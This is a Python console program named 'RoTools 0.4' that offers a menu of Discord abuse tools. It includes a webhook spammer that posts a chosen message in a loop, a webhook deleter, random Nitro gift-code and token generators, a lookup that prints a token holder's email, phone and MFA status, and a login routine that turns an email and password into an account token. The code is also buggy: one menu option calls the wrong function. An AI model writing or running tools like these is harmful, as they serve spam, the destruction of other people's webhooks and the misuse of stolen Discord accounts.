# ═║╔╗╚╝╠╣╩╬
#Colorama
from colorama import *
#Others
import os, requests, random, string, base64
#Credits

def Credits():
    os.system('title RoTools 0.4 - Credits')
    os.system('cls')
    
    print(F"{Fore.CYAN}╔═════════════════════════════════════════════════════════╗")#-------------------|
    print(F"{Fore.CYAN}║{Fore.WHITE}██████╗  █████╗ ████████╗ █████╗  █████╗ ██╗      ██████╗{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██║     ██╔════╝{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██████╔╝██║  ██║   ██║   ██║  ██║██║  ██║██║     ╚█████╗ {Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██╔══██╗██║  ██║   ██║   ██║  ██║██║  ██║██║      ╚═══██╗{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██║  ██║╚█████╔╝   ██║   ╚█████╔╝╚█████╔╝███████╗██████╔╝{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}╚═╝  ╚═╝ ╚════╝    ╚═╝    ╚════╝  ╚════╝ ╚══════╝╚═════╝ {Fore.CYAN}║")
    print(F"{Fore.CYAN}╠═════════════════════════════════════════════════════════╣")#-------------------|
    print(F"{Fore.CYAN}║{Fore.WHITE} Made By: RodrikWan                                      {Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE} Version: 0.4.0-prealpha                                 {Fore.CYAN}║")
    print(F"{Fore.CYAN}║                                                         ║")#-------------------|
    print(F"{Fore.CYAN}║{Fore.WHITE} Changelog:                                              {Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE} - Added Token from Email/Password                       {Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE} - Changed color UI                                      {Fore.CYAN}║")
    print(F"{Fore.CYAN}╚═════════════════════════════════════════════════════════╝")#-------------------|
    
    input(f"\n{Fore.WHITE}Press [Enter] to return to Main Menu")
    MainMenu()

#Discord Menu

def DiscordMenu():
    os.system('title RoTools 0.4 - Discord Menu')
    os.system('cls')
    
    print(F"{Fore.CYAN}╔═════════════════════════════════════════════════════════╗")#-------------------|
    print(F"{Fore.CYAN}║{Fore.WHITE}██████╗  █████╗ ████████╗ █████╗  █████╗ ██╗      ██████╗{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██║     ██╔════╝{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██████╔╝██║  ██║   ██║   ██║  ██║██║  ██║██║     ╚█████╗ {Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██╔══██╗██║  ██║   ██║   ██║  ██║██║  ██║██║      ╚═══██╗{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██║  ██║╚█████╔╝   ██║   ╚█████╔╝╚█████╔╝███████╗██████╔╝{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}╚═╝  ╚═╝ ╚════╝    ╚═╝    ╚════╝  ╚════╝ ╚══════╝╚═════╝ {Fore.CYAN}║")
    print(F"{Fore.CYAN}╠═════════════════════════════════════════════════════════╣")#-------------------|
    print(f"{Fore.CYAN}║{Fore.WHITE} Discord Menu                                            {Fore.CYAN}║")
    print(f"{Fore.CYAN}║                                                         ║")#-------------------|
    print(f"{Fore.CYAN}║{Fore.WHITE} 1 | Discord Nitro Generator                             {Fore.CYAN}║")
    print(f"{Fore.CYAN}║{Fore.WHITE} 2 | Discord Token Generator                             {Fore.CYAN}║")
    print(f"{Fore.CYAN}║{Fore.WHITE} 3 | Discord Token Info                                  {Fore.CYAN}║")
    print(f"{Fore.CYAN}║{Fore.WHITE} 4 | Discord Token from Email/Password                   {Fore.CYAN}║")
    print(f"{Fore.CYAN}║{Fore.WHITE} 5 | Discord Webhook Spammer                             {Fore.CYAN}║")
    print(f"{Fore.CYAN}║{Fore.WHITE} 6 | Discord Webhook Deleter                             {Fore.CYAN}║")
    print(f"{Fore.CYAN}║{Fore.WHITE} 7 | Discord Half token from user ID                     {Fore.CYAN}║")
    print(f"{Fore.CYAN}║{Fore.WHITE} 0 | Main Menu                                           {Fore.CYAN}║")
    print(f"{Fore.CYAN}╚═════════════════════════════════════════════════════════╝")#-------------------|
    
    DiscordMenuChoice = int(input(f"\n{Fore.WHITE}Option: "))
    
    if DiscordMenuChoice == 1:
        NitroGenerator()
    if DiscordMenuChoice == 2:
        TokenGenerator()
    if DiscordMenuChoice == 3:
        TokenInfo()
    if DiscordMenuChoice == 4:
        WebhookSpammer()
    if DiscordMenuChoice == 5:
        WebhookSpammer()
    if DiscordMenuChoice == 6:
        WebhookDeleter()
    if DiscordMenuChoice == 7:
        HalfToken()
    if DiscordMenuChoice == 0:
        MainMenu()
    else:
        print(f"\n{Fore.RED}[ERROR] {Fore.WHITE}Incorrect option")
        input(f'\n{Fore.WHITE}Press [Enter] to return to Discord Menu')
        DiscordMenu()

#Discord Menu > Nitro Generator

def NitroGenerator():
    os.system('title RoTools 0.4 - Discord Nitro Generator')
    os.system('cls')
    
    print(F"{Fore.CYAN}╔═════════════════════════════════════════════════════════╗")#-------------------|
    print(F"{Fore.CYAN}║{Fore.WHITE}██████╗  █████╗ ████████╗ █████╗  █████╗ ██╗      ██████╗{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██║     ██╔════╝{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██████╔╝██║  ██║   ██║   ██║  ██║██║  ██║██║     ╚█████╗ {Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██╔══██╗██║  ██║   ██║   ██║  ██║██║  ██║██║      ╚═══██╗{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██║  ██║╚█████╔╝   ██║   ╚█████╔╝╚█████╔╝███████╗██████╔╝{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}╚═╝  ╚═╝ ╚════╝    ╚═╝    ╚════╝  ╚════╝ ╚══════╝╚═════╝ {Fore.CYAN}║")
    print(F"{Fore.CYAN}╠═════════════════════════════════════════════════════════╣")#-------------------|
    print(F"{Fore.CYAN}║{Fore.WHITE} Discord Nitro Generator                                 {Fore.CYAN}║")
    print(F"{Fore.CYAN}╚═════════════════════════════════════════════════════════╝")#-------------------|
    
    try:
        NitroGeneratorAmount = int(input(f'\n{Fore.WHITE}Amount: '))
        print()
        value = 1
        while value <= NitroGeneratorAmount:
            code = "https://discord.gift/" + ('').join(random.choices(string.ascii_letters + string.digits, k=16))
            print(f'{code}')
            value += 1
        print(f"\n{Fore.CYAN}[INFO] {Fore.WHITE}Generated {NitroGeneratorAmount} codes.")
        input(f"\n{Fore.WHITE}Press [Enter] to return to Discord Menu.")
        DiscordMenu()
    except ValueError:
        print(f"\n{Fore.RED}[ERROR] {Fore.WHITE}Invalid amount")
        input(f"\n{Fore.WHITE}Press [Enter] to return to Discord Menu")
        DiscordMenu()

#Discord Menu > Token Generator

def TokenGenerator():
    os.system('title RoTools 0.4 - Discord Token Generator')
    os.system('cls')
    print(F"{Fore.CYAN}╔═════════════════════════════════════════════════════════╗")#-------------------|
    print(F"{Fore.CYAN}║{Fore.WHITE}██████╗  █████╗ ████████╗ █████╗  █████╗ ██╗      ██████╗{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██║     ██╔════╝{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██████╔╝██║  ██║   ██║   ██║  ██║██║  ██║██║     ╚█████╗ {Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██╔══██╗██║  ██║   ██║   ██║  ██║██║  ██║██║      ╚═══██╗{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██║  ██║╚█████╔╝   ██║   ╚█████╔╝╚█████╔╝███████╗██████╔╝{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}╚═╝  ╚═╝ ╚════╝    ╚═╝    ╚════╝  ╚════╝ ╚══════╝╚═════╝ {Fore.CYAN}║")
    print(F"{Fore.CYAN}╠═════════════════════════════════════════════════════════╣")#-------------------|
    print(F"{Fore.CYAN}║{Fore.WHITE} Discord Token Generator                                 {Fore.CYAN}║")
    print(F"{Fore.CYAN}╚═════════════════════════════════════════════════════════╝")#-------------------|
    
    try:
        TokenGeneratorAmount = int(input(f'\n{Fore.WHITE}Amount: '))
        print()
        value = 1
        while value <= TokenGeneratorAmount:
            code = "Nz" + ('').join(random.choices(string.ascii_letters + string.digits, k=59))
            print(f'{code}')
            value += 1
        print(f"\n{Fore.CYAN}[INFO] {Fore.WHITE}Generated {TokenGeneratorAmount} tokens.")
        input(f'\n{Fore.WHITE}Press [Enter] to return to Discord Menu')
        DiscordMenu()
    except ValueError:
        print(f"\n{Fore.RED}[ERROR] {Fore.WHITE}Invalid amount")
        input(f'\n{Fore.WHITE}Press [Enter] to return to Discord Menu')
        DiscordMenu()

#Discord Menu > Token Info

def TokenInfo():
    os.system('title RoTools 0.4 - Discord Token Info')
    os.system('cls')
    
    print(F"{Fore.CYAN}╔═════════════════════════════════════════════════════════╗")#-------------------|
    print(F"{Fore.CYAN}║{Fore.WHITE}██████╗  █████╗ ████████╗ █████╗  █████╗ ██╗      ██████╗{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██║     ██╔════╝{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██████╔╝██║  ██║   ██║   ██║  ██║██║  ██║██║     ╚█████╗ {Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██╔══██╗██║  ██║   ██║   ██║  ██║██║  ██║██║      ╚═══██╗{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██║  ██║╚█████╔╝   ██║   ╚█████╔╝╚█████╔╝███████╗██████╔╝{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}╚═╝  ╚═╝ ╚════╝    ╚═╝    ╚════╝  ╚════╝ ╚══════╝╚═════╝ {Fore.CYAN}║")
    print(F"{Fore.CYAN}╠═════════════════════════════════════════════════════════╣")#-------------------|
    print(F"{Fore.CYAN}║{Fore.WHITE} Discord Token Info                                      {Fore.CYAN}║")
    print(F"{Fore.CYAN}╚═════════════════════════════════════════════════════════╝")#-------------------|
    
    TokenInfoToken = input(f'\n{Fore.WHITE}Token: ')

    headers = {'Authorization': TokenInfoToken, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code == 200:
        userName = r.json()['username'] + '#' + r.json()['discriminator']
        userID = r.json()['id']
        phone = r.json()['phone']
        email = r.json()['email']
        mfa = r.json()['mfa_enabled']
        verified = r.json()['verified']
        
        print(f"\n{Fore.WHITE}User: {userName}")
        print(f"{Fore.WHITE}ID: {userID}")
        print(f"{Fore.WHITE}Phone: {phone}")
        print(f"{Fore.WHITE}Email: {email}")
        print(f"{Fore.WHITE}MFA: {mfa}")
        print(f"{Fore.WHITE}Verified: {verified}")
        print(f"{Fore.WHITE}Token: {TokenInfoToken}")
        print(f"\n{Fore.CYAN}[INFO] {Fore.WHITE}Info generated")
        input(f'\n{Fore.WHITE}Press [Enter] to return to Discord Menu')
        DiscordMenu()
    else:
        print(f"\n{Fore.RED}[ERROR] {Fore.WHITE}Invalid Token")
        input(f'\n{Fore.WHITE}Press [Enter] to return to Discord Menu')
        DiscordMenu()

#Discord Menu > Token from Email/Password

def TokenFromEmailPass():
    os.system('title RoTools 0.4 - Discord Token from Email/Password')
    os.system('cls')
    
    print(F"{Fore.CYAN}╔═════════════════════════════════════════════════════════╗")#-------------------|
    print(F"{Fore.CYAN}║{Fore.WHITE}██████╗  █████╗ ████████╗ █████╗  █████╗ ██╗      ██████╗{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██║     ██╔════╝{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██████╔╝██║  ██║   ██║   ██║  ██║██║  ██║██║     ╚█████╗ {Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██╔══██╗██║  ██║   ██║   ██║  ██║██║  ██║██║      ╚═══██╗{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██║  ██║╚█████╔╝   ██║   ╚█████╔╝╚█████╔╝███████╗██████╔╝{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}╚═╝  ╚═╝ ╚════╝    ╚═╝    ╚════╝  ╚════╝ ╚══════╝╚═════╝ {Fore.CYAN}║")
    print(F"{Fore.CYAN}╠═════════════════════════════════════════════════════════╣")#-------------------|
    print(F"{Fore.CYAN}║{Fore.WHITE} Discord Token from Email/Password                       {Fore.CYAN}║")
    print(F"{Fore.CYAN}╚═════════════════════════════════════════════════════════╝")#-------------------|
    
    TokenFromEmail = input(f'\n{Fore.WHITE}Email: ')
    TokenFromPassword = input(f'\n{Fore.WHITE}Password: ')

    data={'email': TokenFromEmail, 'password': TokenFromPassword, 'undelete': "false"}
    headers={'content-type': "application/json", 'user-agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"}
    r = requests.post('https://discord.com/api/v8/auth/login', json=data, headers=headers)
    if r.status_code == 200:
        token = r.json()['token']
        print(f'\n{Fore.WHITE}TOKEN: {token}')
        print(f"\n{Fore.CYAN}[INFO] {Fore.WHITE}Token generated")
        input(f'\n{Fore.WHITE}Press [Enter] to return to Discord Menu')
        DiscordMenu()
        os.system('cls; clear')
    elif "PASSWORD_DOES_NOT_MATCH" in r.text:
        print(f"\n{Fore.RED}[ERROR] {Fore.WHITE}Invalid password")
        input(f'\n{Fore.WHITE}Press [Enter] to return to Discord Menu')
        DiscordMenu()
    elif "captcha-required" in r.text:
        print(f"\n{Fore.RED}[ERROR] {Fore.WHITE}Returned captcha")
        input(f'\n{Fore.WHITE}Press [Enter] to return to Discord Menu')
        DiscordMenu()
    else:
        print(f"\n{Fore.RED}[ERROR] {Fore.WHITE}Invalid email or password")
        input(f'\n{Fore.WHITE}Press [Enter] to return to Discord Menu')
        DiscordMenu()

#Discord Menu > WebHook Spammer

def WebhookSpammer():
    os.system('title RoTools 0.4 - Discord Webhook Spammer')
    os.system('cls')
    
    print(F"{Fore.CYAN}╔═════════════════════════════════════════════════════════╗")#-------------------|
    print(F"{Fore.CYAN}║{Fore.WHITE}██████╗  █████╗ ████████╗ █████╗  █████╗ ██╗      ██████╗{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██║     ██╔════╝{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██████╔╝██║  ██║   ██║   ██║  ██║██║  ██║██║     ╚█████╗ {Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██╔══██╗██║  ██║   ██║   ██║  ██║██║  ██║██║      ╚═══██╗{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██║  ██║╚█████╔╝   ██║   ╚█████╔╝╚█████╔╝███████╗██████╔╝{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}╚═╝  ╚═╝ ╚════╝    ╚═╝    ╚════╝  ╚════╝ ╚══════╝╚═════╝ {Fore.CYAN}║")
    print(F"{Fore.CYAN}╠═════════════════════════════════════════════════════════╣")#-------------------|
    print(F"{Fore.CYAN}║{Fore.WHITE} Discord Webhook Spammer                                 {Fore.CYAN}║")
    print(F"{Fore.CYAN}╚═════════════════════════════════════════════════════════╝")#-------------------|
    
    try:
        WebhookSpammerWebhook = input(f"\n{Fore.WHITE}Webhook: ")
        WebhookSpammerMessage = input(f"{Fore.WHITE}Message: ")
        WebhookSpammerAmount = int(input(f"{Fore.WHITE}Amount: "))
        print()
        for i in range(WebhookSpammerAmount):
            _data = requests.post(WebhookSpammerWebhook, json={'content': WebhookSpammerMessage}, headers={'Content-Type': 'application/json'})
            if _data.status_code < 400:
                print(f'{Fore.GREEN}[SUCCESS] {Fore.WHITE}Sent a message')
        print(f'\n{Fore.CYAN}[INFO] {Fore.WHITE}Sent {WebhookSpammerAmount} messages')
        input(f"\n{Fore.WHITE}Press [Enter] to return to Discord Menu")
        DiscordMenu()
    except:
        print(f"\n{Fore.RED}[ERROR] {Fore.WHITE}Couldn't spam Webhook")
        input(f"\n{Fore.WHITE}Press [Enter] to return to Discord Menu")
        DiscordMenu()

#Discord Menu > Webhook Deleter

def WebhookDeleter():
    os.system('title RoTools 0.4 - Discord Webhook Deleter')
    os.system('cls')
    
    print(F"{Fore.CYAN}╔═════════════════════════════════════════════════════════╗")#-------------------|
    print(F"{Fore.CYAN}║{Fore.WHITE}██████╗  █████╗ ████████╗ █████╗  █████╗ ██╗      ██████╗{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██║     ██╔════╝{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██████╔╝██║  ██║   ██║   ██║  ██║██║  ██║██║     ╚█████╗ {Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██╔══██╗██║  ██║   ██║   ██║  ██║██║  ██║██║      ╚═══██╗{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██║  ██║╚█████╔╝   ██║   ╚█████╔╝╚█████╔╝███████╗██████╔╝{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}╚═╝  ╚═╝ ╚════╝    ╚═╝    ╚════╝  ╚════╝ ╚══════╝╚═════╝ {Fore.CYAN}║")
    print(F"{Fore.CYAN}╠═════════════════════════════════════════════════════════╣")#-------------------|
    print(F"{Fore.CYAN}║{Fore.WHITE} Discord Webhook Deleter                                 {Fore.CYAN}║")
    print(F"{Fore.CYAN}╚═════════════════════════════════════════════════════════╝")#-------------------|
    try:
        WebhookDeleterWebhook = input(f"\n{Fore.WHITE}Webhook: ")
        requests.delete(WebhookDeleterWebhook.rstrip())
        print(f'\n{Fore.CYAN}[INFO] {Fore.WHITE}Webhook deleted')
        input(f"\n{Fore.WHITE}Press [Enter] to return to Discord Menu")
        DiscordMenu()
    except:
        print(f"\n{Fore.RED}[ERROR] {Fore.WHITE}Couldn't delete Webhook")
        input(f"\n{Fore.WHITE}Press [Enter] to return to Discord Menu")
        DiscordMenu()

#Discord Menu > HalfToken

def HalfToken():
    os.system('title RoTools 0.4 - Discord Half Token from user ID')
    os.system('cls')
    
    print(F"{Fore.CYAN}╔═════════════════════════════════════════════════════════╗")#-------------------|
    print(F"{Fore.CYAN}║{Fore.WHITE}██████╗  █████╗ ████████╗ █████╗  █████╗ ██╗      ██████╗{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██║     ██╔════╝{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██████╔╝██║  ██║   ██║   ██║  ██║██║  ██║██║     ╚█████╗ {Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██╔══██╗██║  ██║   ██║   ██║  ██║██║  ██║██║      ╚═══██╗{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██║  ██║╚█████╔╝   ██║   ╚█████╔╝╚█████╔╝███████╗██████╔╝{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}╚═╝  ╚═╝ ╚════╝    ╚═╝    ╚════╝  ╚════╝ ╚══════╝╚═════╝ {Fore.CYAN}║")
    print(F"{Fore.CYAN}╠═════════════════════════════════════════════════════════╣")#-------------------|
    print(F"{Fore.CYAN}║{Fore.WHITE} Discord Half token from user ID                         {Fore.CYAN}║")
    print(F"{Fore.CYAN}╚═════════════════════════════════════════════════════════╝")#-------------------|
    
    userid = input('\nUserID: ')
    string_b = f"{userid}".encode('utf')
    bas64_bytes = base64.b64encode(string_b)
    HalfTokenGen = bas64_bytes.decode('utf-8')
    print(f'\nHalf Token: {HalfTokenGen}')
    print(f'\n{Fore.CYAN}[INFO] {Fore.WHITE}Half token generated')
    input(f"\n{Fore.WHITE}Press [Enter] to return to Discord Menu")
    DiscordMenu()

#Main Menu

def MainMenu():
    os.system('title RoTools 0.4 - Main Menu')
    os.system('cls')
    
    print(F"{Fore.CYAN}╔═════════════════════════════════════════════════════════╗")#-------------------|
    print(F"{Fore.CYAN}║{Fore.WHITE}██████╗  █████╗ ████████╗ █████╗  █████╗ ██╗      ██████╗{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██║     ██╔════╝{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██████╔╝██║  ██║   ██║   ██║  ██║██║  ██║██║     ╚█████╗ {Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██╔══██╗██║  ██║   ██║   ██║  ██║██║  ██║██║      ╚═══██╗{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}██║  ██║╚█████╔╝   ██║   ╚█████╔╝╚█████╔╝███████╗██████╔╝{Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE}╚═╝  ╚═╝ ╚════╝    ╚═╝    ╚════╝  ╚════╝ ╚══════╝╚═════╝ {Fore.CYAN}║")
    print(F"{Fore.CYAN}╠═════════════════════════════════════════════════════════╣")#-------------------|
    print(F"{Fore.CYAN}║{Fore.WHITE} Main Menu                                               {Fore.CYAN}║")
    print(F"{Fore.CYAN}║                                                         ║")#-------------------|
    print(F"{Fore.CYAN}║{Fore.WHITE} 1 | Credits                                             {Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE} 2 | Discord Menu                                        {Fore.CYAN}║")
    print(F"{Fore.CYAN}║{Fore.WHITE} 0 | Exit                                                {Fore.CYAN}║")
    print(F"{Fore.CYAN}╚═════════════════════════════════════════════════════════╝")#-------------------|
    
    MainMenuChoice = int(input(f"\n{Fore.WHITE}Option: "))
    
    if MainMenuChoice == 1:
        Credits()
    if MainMenuChoice == 2:
        DiscordMenu()
    if MainMenuChoice == 0:
        exit
    else:
        print(f"\n{Fore.RED}[ERROR] {Fore.WHITE}Incorrect option")
        input(f'\n{Fore.WHITE}Press [Enter] to return to Main Menu')
        MainMenu()

MainMenu()